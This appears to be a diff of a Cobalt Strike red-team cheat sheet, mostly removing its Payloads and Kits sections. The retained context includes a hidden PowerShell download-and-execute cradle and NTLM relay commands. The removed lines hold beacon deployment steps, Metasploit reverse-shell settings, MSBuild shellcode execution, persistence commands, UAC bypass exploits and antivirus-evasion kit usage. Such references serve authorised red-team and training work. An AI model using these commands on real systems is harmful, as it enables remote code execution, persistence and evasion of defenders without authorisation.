@@ -13,7 +13,6 @@ $ ./cobaltstrike
 $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
 ```
 
-
 ## Summary
 
 * [Infrastructure](#infrastructure)
@@ -21,11 +20,6 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Domain fronting](#domain-fronting)
 * [OpSec](#opsec)
     * [Customer ID](#customer-id)
-* [Payloads](#payloads)
-    * [DNS Beacon](#dns-beacon)
-    * [SMB Beacon](#smb-beacon)
-    * [Metasploit compatibility](#metasploit-compatibility)
-    * [Custom Payloads](#custom-payloads)
 * [Malleable C2](#malleable-c2)
 * [Files](#files)
 * [Powershell and .NET](#powershell-and-net)
@@ -33,15 +27,6 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [.NET remote execution](#net-remote-execution)
 * [Lateral Movement](#lateral-movement)
 * [VPN & Pivots](#vpn--pivots)
-* [Kits](#kits)
-    * [Elevate Kit](#elevate-kit)
-    * [Persistence Kit](#persistence-kit)
-    * [Resource Kit](#resource-kit)
-    * [Artifact Kit](#artifact-kit)
-    * [Mimikatz Kit](#mimikatz-kit)
-    * [Sleep Mask Kit](#sleep-mask-kit)
-    * [Mutator Kit](#mutator-kit)
-    * [Thread Stack Spoofer](#thread-stack-spoofer)
 * [Beacon Object Files](#beacon-object-files)
 * [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
 * [References](#references)
@@ -85,99 +70,6 @@ socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80
 * The trial has a Customer ID value of 0. 
 * Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool
 
-## Payloads
-
-### DNS Beacon
-
-* Edit the Zone File for the domain
-* Create an A record for Cobalt Strike system
-* Create an NS record that points to FQDN of your Cobalt Strike system
-
-Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server's A record.
-
-* nslookup jibberish.beacon polling.campaigns.domain.com
-* nslookup jibberish.beacon campaigns.domain.com
-
-Example of DNS on Digital Ocean:
-
-```powershell
-NS  example.com                     directs to 10.10.10.10.            86400
-NS  polling.campaigns.example.com   directs to campaigns.example.com.	3600
-A	campaigns.example.com           directs to 10.10.10.10	            3600 
-```
-
-```powershell
-systemctl disable systemd-resolved
-systemctl stop systemd-resolved
-rm /etc/resolv.conf
-echo "nameserver 8.8.8.8" >  /etc/resolv.conf
-echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
-```
-
-Configuration:
-1. **host**: campaigns.domain.com
-2. **beacon**: polling.campaigns.domain.com
-3. Interact with a beacon, and `sleep 0`
-
-
-### SMB Beacon   
-
-```powershell
-link [host] [pipename]
-connect [host] [port]
-unlink [host] [PID]
-jump [exec] [host] [pipe]
-```
-
-SMB Beacon uses Named Pipes. You might encounter these error code while running it.
-
-| Error Code | Meaning              | Description                                        |
-|------------|----------------------|----------------------------------------------------|
-| 2          | File Not Found       | There is no beacon for you to link to              |
-| 5          | Access is denied     | Invalid credentials or you don't have permission   |
-| 53         | Bad Netpath          | You have no trust relationship with the target system. It may or may not be a beacon there. |
-
-
-### SSH Beacon
-
-```powershell
-# deploy a beacon
-beacon> help ssh
-Use: ssh [target:port] [user] [pass]
-Spawn an SSH client and attempt to login to the specified target
-
-beacon> help ssh-key
-Use: ssh [target:port] [user] [/path/to/key.pem]
-Spawn an SSH client and attempt to login to the specified target
-
-# beacon's commands
-upload                    Upload a file
-download                  Download a file
-socks                     Start SOCKS4a server to relay traffic
-sudo                      Run a command via sudo
-rportfwd                  Setup a reverse port forward
-shell                     Execute a command via the shell
-```
-
-### Metasploit compatibility
-
-* Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https
-* Set LHOST and LPORT to the beacon
-* Set DisablePayloadHandler to True
-* Set PrependMigrate to True
-* exploit -j
-
-### Custom Payloads
-
-https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c
-
-```powershell
-* Attacks > Packages > Payload Generator 
-* Attacks > Packages > Scripted Web Delivery (S)
-$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
-$ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
-$ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
-```
 
 ## Malleable C2
 
@@ -360,104 +252,6 @@ beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin
 beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
 ```
 
-## Kits
-
-* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/) - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike
-
-### Elevate Kit
-
-UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)
-
-```powershell
-beacon> runasadmin
-
-Beacon Command Elevators
-========================
-
-    Exploit                         Description
-    -------                         -----------
-    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
-    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
-    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
-    svc-exe                         Get SYSTEM via an executable run as a service
-    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
-    uac-token-duplication           Bypass UAC with Token Duplication
-```
-
-### Persistence Kit
-
-* https://github.com/0xthirteen/MoveKit
-* https://github.com/fireeye/SharPersist
-    ```powershell
-    # List persistences
-    SharPersist -t schtaskbackdoor -m list
-    SharPersist -t startupfolder -m list
-    SharPersist -t schtask -m list
-
-    # Add a persistence
-    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
-    SharPersist -t schtaskbackdoor -n "Something Cool" -m remove
-
-    SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
-    SharPersist -t service -n "Some Service" -m remove
-
-    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
-    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
-    SharPersist -t schtask -n "Some Task" -m remove
-    ```
-
-### Resource Kit
-
-> The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows
-
-### Artifact Kit
-
-> Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder.
-
-Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
-
-- Download the artifact kit : `Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)`
-- Install the dependencies : `sudo apt-get install mingw-w64`
-- Edit the Artifact code
-    * Change pipename strings
-    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
-    * Change Import
-- Build the Artifact
-- Cobalt Strike -> Script Manager > Load .cna
-
-
-### Mimikatz Kit
-
-* Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)
-* Load the mimikatz.cna aggressor script
-* Use mimikatz functions as normal
-
-
-### Sleep Mask Kit
-
-> The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.
-
-Use the included `build.sh` or `build.bat` script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.
-
-
-### Mutator Kit
-
-> The Mutator Kit, introduced by Cobalt Strike, is a tool designed to create uniquely mutated versions of a "sleep mask" used in payloads to evade detection by static signatures. It utilizes LLVM obfuscation techniques to alter the sleep mask, making it difficult for memory scanning tools to identify the mask based on predefined patterns, thereby enhancing operational security for red team activities.
-
-The OBFUSCATIONS variable can be `flattening`,`substitution`,`split-basic-blocks`,`bogus`.
-
-```ps1
-OBFUSCATIONS=substitution mutator.sh x64 -emit-llvm -S example.c -o example_with_substitutions.ll
-mutator.sh x64 -c -DIMPL_CHKSTK_MS=1 -DMASK_TEXT_SECTION=1 -o sleepmask.x64.o src49/sleepmask.c
-```
-
-
-### Thread Stack Spoofer
-
-> An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory.
-
-Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option `artifactkit_stack_spoof` in the config file `arsenal_kit.config`.
-
 
 ## Beacon Object Files
 
@@ -478,6 +272,7 @@ Example: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h
     ```
 * Execute: `inline-execute /path/to/hello.o`
 
+
 ## NTLM Relaying via Cobalt Strike
 
 ```powershell
@@ -487,6 +282,7 @@ beacon> rportfwd_local 8445 <IP_KALI> 445
 beacon> upload C:\Tools\PortBender\WinDivert64.sys
 beacon> PortBender redirect 445 8445
 ```
+
 
 ## References
 
@@ -507,4 +303,3 @@ beacon> PortBender redirect 445 8445
 * [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
 * [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
 * [Cobalt Strike 4.6 - User Guide PDF](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-6-user-guide.pdf)
-* [Introducing the Mutator Kit: Creating Object File Monstrosities with Sleep Mask and LLVM - @joehowwolf @HenriNurmi](https://www.cobaltstrike.com/blog/introducing-the-mutator-kit-creating-object-file-monstrosities-with-sleep-mask-and-llvm)
